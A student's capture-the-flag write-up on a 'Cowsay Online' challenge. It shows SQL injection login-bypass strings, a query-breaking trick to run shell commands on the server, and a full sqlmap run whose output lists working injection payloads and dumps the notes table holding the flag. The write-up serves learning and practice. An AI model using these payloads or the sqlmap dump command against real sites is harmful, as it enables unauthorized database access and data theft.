layout: page
title: Winter week 1
permalink: /wweek1

Cowsay
# Challenge description
Welcome to Cowsay Online, here for all your cowsaying needs! Our site is built so secure, we don't even have a bug bounty program because we wouldn't want researchers to waste their time. Don't even think about trying to gain unauthorized access!

# Flag 1
My first instinct was to google basic sql injection examples, and this one from [w3schools](https://www.w3schools.com/sql/sql_injection.asp) caught my eye:
```
" or ""="
```

Throwing that into both input fields spit out:
```
* **Query:** SELECT id, username, password FROM users WHERE username='" or ""="' AND password='" or ""="';  
* **Results:**  
(none)

### Login attempt failed.
```

Upon first glance, I thought that it hadn't worked because I was barking down the wrong path, but after I looked at what was actually sent as the query I saw double and single quotes.

What the database was receiving was actually

```
Find username/password Where username/password is (exactly) " or ""="
```

This clearly makes no sense since no username would contain ", but if I rewrote it using single quotes then the query would look more like:

```
Find username/password Where username/password is '' or ''=''
```

Basically is the username empty (which is unlikely, or is empty equal to empty (which is always true)

Sending this spits out all the usernames & passwords, but in our case it just logs us into cowsay
# Flag 1

Upon logging in, we are greeted by a talking cow:
![[Pasted image 20260112121934.png]]
(This was taken after I submitted the automatically generated query)

My teammate, cow, shared a table of logins and passwords, they got from using sqlmap, a tool I have no experience with:
![[Pasted image 20260112122222.png]]
They also sent a mysterious command at the bottom, which when entered into the query field returns this:

![[Pasted image 20260112122316.png]]

My best guess for what's happening here is:
1 - ends the string input into the query with '
2 - ends the query command with ;
3 - runs ls in the new space created by ;
4 - comments out the rest so nothing else is run with #

This lets us run any command on the server, which we could use to search through the entire filesystem with find the flag with something like:

```
find / -name "*flag*"
```

to find anything with flag or it. you could also probably use grep, but I instead tried the first thing that came to my head, ls /

![[Pasted image 20260112122757.png]]

This spit out the entire root directory, including flag.txt which we can simply extract for the flag:

```
cat /flag.txt
```

# Flag 2

I did not solve this flag, my teammate cow again showed up with a single command and the submitted flag:
![[Pasted image 20260112123041.png]]

I have never heard of sqlmap, so here are the steps I took to understand how spits out the flag:

First I ran it. generally not a good idea, but I trust them and I'm curious enough to say "screw it", with less kind language. doing that spits out all this data:

```
┌──(celelste㉿whitebox)-[~]
└─$ sqlmap -u https://cowsay.ctf-league.osusec.org/login.php --data="username=PHP&password=secret" --batch -D cowsay -T notes --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:31:36 /2026-01-12/

[12:31:36] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=b44859bf433...a0cc726017'). Do you want to use those [Y/n] Y
[12:31:36] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:31:37] [INFO] testing if the target URL content is stable
[12:31:37] [INFO] target URL content is stable
[12:31:37] [INFO] testing if POST parameter 'username' is dynamic
[12:31:37] [WARNING] POST parameter 'username' does not appear to be dynamic
[12:31:37] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
[12:31:37] [INFO] testing for SQL injection on POST parameter 'username'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[12:31:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:31:37] [WARNING] reflective value(s) found and filtering out
[12:31:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:31:39] [INFO] testing 'Generic inline queries'
[12:31:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[12:31:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[12:31:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[12:31:51] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="Login attempt failed.")
[12:31:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[12:31:51] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[12:31:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[12:31:52] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[12:31:52] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[12:31:52] [INFO] POST parameter 'username' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
[12:31:52] [INFO] testing 'MySQL inline queries'
[12:31:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[12:31:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[12:31:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[12:31:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[12:31:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[12:31:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[12:31:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:32:03] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[12:32:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:32:03] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[12:32:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:32:03] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[12:32:04] [INFO] target URL appears to have 3 columns in query
[12:32:04] [INFO] POST parameter 'username' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[12:32:04] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 130 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: username=PHP' OR NOT 8111=8111#&password=secret

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=PHP' AND GTID_SUBSET(CONCAT(0x716b627171,(SELECT (ELT(9746=9746,1))),0x71626a7a71),9746)-- wROk&password=secret

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=PHP' AND (SELECT 6262 FROM (SELECT(SLEEP(5)))YSxh)-- BEHY&password=secret

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: username=PHP' UNION ALL SELECT NULL,CONCAT(0x716b627171,0x434a4675484a5673714c61466772755053444559524f624450474f624c746275456f717363724c64,0x71626a7a71),NULL#&password=secret
---
[12:32:04] [INFO] the back-end DBMS is MySQL
web application technology: PHP, PHP 8.4.15
back-end DBMS: MySQL >= 5.6
[12:32:05] [INFO] fetching columns for table 'notes' in database 'cowsay'
[12:32:05] [INFO] fetching entries for table 'notes' in database 'cowsay'
Database: cowsay
Table: notes
[10 entries]
+----+--------+------------------------------------------------------------------------------------+------------+
| id | userid | body                                                                               | title      |
+----+--------+------------------------------------------------------------------------------------+------------+
| 1  | -1     | the next note has the flag!                                                        | keep going |
| 2  | -1     | Nice work! The flag is osu{r3m3mber_t0_g00gle_wh3n_f@cing_a_d1ff1cul7-ch4ll3ng3!}  | your flag  |
| 3  | -1     | you dont need to keep reading notes if you dont want to. the flag was one note ago | thats it   |
| 4  | 1      | Hello, world!                                                                      | Title      |
| 5  | 1      | Hello, world!                                                                      | Title      |
| 6  | 1      | hello                                                                              | my note    |
| 7  | 1      | <blank>                                                                            | Flag.txt   |
| 8  | 1      | <blank>                                                                            | Flag       |
| 9  | 1      | /                                                                                  | /          |
| 10 | 1      | '; --                                                                              | '; --      |
+----+--------+------------------------------------------------------------------------------------+------------+

[12:32:06] [INFO] table 'cowsay.notes' dumped to CSV file '/home/celelste/.local/share/sqlmap/output/cowsay.ctf-league.osusec.org/dump/cowsay/notes.csv'
[12:32:06] [INFO] fetched data logged to text files under '/home/celelste/.local/share/sqlmap/output/cowsay.ctf-league.osusec.org'

[*] ending @ 12:32:06 /2026-01-12/
```

The first few lines make me think that its testing various types of sql injection vulnerabilities (which upon googling sqlmap, seems to be the purpose). Later on it looks like its going through notes, one of which includes the flag.

Referencing mandb for the flags, we can dissect the command:

-u asks for a target url
--data asks for a data string to be sent through post, in our case: "username=PHP&password=secret"
--batch specifies to never ask for user input
-D asks for which database to enumerate, in our case cowsay
-T asks for which table to enumerate, in our case notes
--dump dumps all the table entries

So essentially what's happening here is we're:
1 - asking sqlmap to test cowsay online for sql injection vulnerabilities
I'll interrupt this well-ordered list to say that im not quite sure how --data works and I'm just gonna have to accept that it does ¯\\_(ツ)_/¯
3 - go through the notes table, in the cowsay database and dump all the entries

I would love to know how he got to this point, but I'm just not sure. What I do know, is that sqlmap will likely be a very helpful tool in future sql-based challenges and its another good tool to know about.